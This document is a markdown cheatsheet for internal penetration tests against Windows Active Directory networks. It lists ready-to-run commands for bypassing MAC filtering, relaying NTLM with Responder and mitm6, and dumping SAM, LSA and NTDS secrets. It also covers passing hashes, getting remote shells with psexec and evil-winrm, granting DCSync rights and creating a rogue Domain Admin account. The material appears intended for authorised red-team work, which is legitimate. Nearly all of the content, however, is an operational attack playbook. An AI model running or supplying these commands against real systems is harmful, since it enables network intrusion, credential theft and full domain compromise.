# Internal Penetration Testing

## No network access

### Wi-Fi

* Crack WPA or crack/replay PEAP \(check next cheatsheet : WIFI\)

### **NAC - MAC filtering**

* Spoof mac from any authorized device \(printer\) and disconnect it: `macchanger -r eth0`
* force your static IP to match the one that you spoofed the mac from : `sudo ifconfig 10.11.12.13/24 && sudo ip route add default via <gateway_ip>`

### NAC - 802.1X

* IEEE 802.1X bypass :

  [https://github.com/Orange-Cyberdefense/fenrir-ocd](https://github.com/Orange-Cyberdefense/fenrir-ocd)

## No account yet

### Physical access

Boot from Kali Linux and dump creds

```bash
cd SystemRoot%\system32\Config\SAM
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
```

### Port and service scan

nmap

```bash
nmap -Pn -n -sSUV -n -vvv --reason -pT:137-139,445,U:137-139 -oA SMB <hosts>
nmap --version-all -sV -sC -oA top1000 <hosts>
nmap --version-all -sV -sC -p- -oA allports <hosts>
```

Search for low hanging fruits \(MS17 / default password TOMCAT VNC ... \)

```bash
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/http/tomcat_mgr_login
searchsploit <service_name>
```

### Man-In-The-Middle

Responder + NTLMrelayx

First we need to edit  responder.conf like this :

`vim /usr/share/responder/Responder.conf`

```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

Then we create a list of targets :

```bash
nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
```

> if the scope is small : `cme smb <targets> --gen-relay-list relaylistOutputFilename.txt`

After we can run Responder + ntlmrelayx

```bash
python Responder.py -I <interface> -rdw
ntlmrelayx.py -tf relaylistOutputFilename.txt
```

> This command will generate many log files which contain SAM hashes, just get all these files and store it into a formatted file that includes all hashes. \( `cat *.sam |sort -u > hashs.txt` \) Then you can just run CrackMapExec on full scope using theses hashes :

`crackmapexec smb perim_up_smb.txt -u Administrator -d '.' -H hashs.txt --lsa`

mitm6 + NTLMrelayx

```bash
sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
ntlmrelayx.py -tf relaylistOutputFilename.txt -6 
```

ARP \(use with caution !\)

```bash
Bettercap
Cain.exe (& Abel)
```

### **Domain enum**

Get DC IP

```bash
cat /etc/resolv.conf
nslookup <domain>
```

Password policy \(especially lockout threshold for bruteforce\)

```bash
enum4linux -P -o <target>
enum4linux -a <target>
```

Open shares \(anonymous SMB, NFS, FTP, etc\)

SMB

```bash
smbmap -H IP -r DOSSIER
smbmap -H IP --download DOSSIER

smbclient -L ///192.168.0.1 -U <user> -c ls
```

NFS 

```bash
showmount -e <target>
mount <target>:/home/xx /mnt/yy 
```

kerberos

```bash
nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/root/users.txt 10.10.10.169
./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
```

## Unprivileged account only 

### Get a shell

> for winRM do : `PATH="ruby -e 'puts Gem.user_dir'/bin:$PATH"`

```bash
.\WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
wmiexec.py <domain>\<user>:<pass>@<target>
winexe -U <domain>/<user>%<pass> //<target> cmd.exe /c dir C:\
evil-winrm -i <target> -u <user> -p '<pass>'
python psexec.py '<user>:<pass>@<target>'
```

### Domain enum

```bash
enum4linux -a <target_dc> -u <USER> -p <PASSWORD> -d <domain>
bloodhound.py -d <DOMAIN> -u <user> -p <password> -dc <FQDN-SERVER> -c all
python ldapdomaindump.py -u '<domain>\<user>' -p '<pass>' <target>
sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
```

### SMB  restricted shares

```bash
smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
smbget -rR smb://<target>/<share>/ -U <user>
smbclient \\\\<target>\\c$ -U <user>
smbclient -L //<target> -U '<domain>\<user>`
upload .ico .scf => Responder/NTLMrelayx
```

### Low Privilege Escalation

See next cheatsheet LPE Windows or LPE Linux

## Local Admin account

### Dump secrets

LSA & SAM

```bash
crackmapexec smb perim_up.txt -u '<user>' -d '<domain>' -p '<pass>' --lsa
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa

lsassy -d '.' -u 'Administrateur' -H '<hash>' <ip>
lsassy -d <domain> -u <user> -p <pass> <ip>

./spraykatz.py -u <user> -p <password> -t <ip>
```

Browser secrets

```bash
sharpchrome.exe
```

### Replay the secrets found

LM/NTLM hash or cleartext password with CrackMapExec

```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
```

### Pivoting

See next cheatsheet Pivoting

### **Domain escalation**

Remote GUI domain \(RSAT\)

* [https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT\_WS\_1709-x64.msu](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu) \(Users and Computers AD =&gt; View =&gt; Advanced\)

ACLs

Get ACL

```bash
Get-DomainObjectAcl -Identity <username> -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID <domain>) }
```

add DCSync

```bash
Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<local>" -PrincipalIdentity <username> -Rights DCSync
```

dump ntds 

```bash
meterpreter > dcsync_ntlm <DOMAIN>\<user>
```

**Kerberos impersonate**

Find domain admin accounts 

```bash
net group "Domain Admins" /DOMAIN
```

Find which if one is loggedin somewhere :

```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --loggedin
```

Impersonate his kerberos token

```bash
Rubeus.exe
incongnito (meterpreter)
```

Create new Domain Admin account 

```bash
net user add <user> <pass> /domain
net group "Domain Admins" <user> /add
```

## Domain admin account

### Dump NDTS.dit from DC

```bash
cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
```



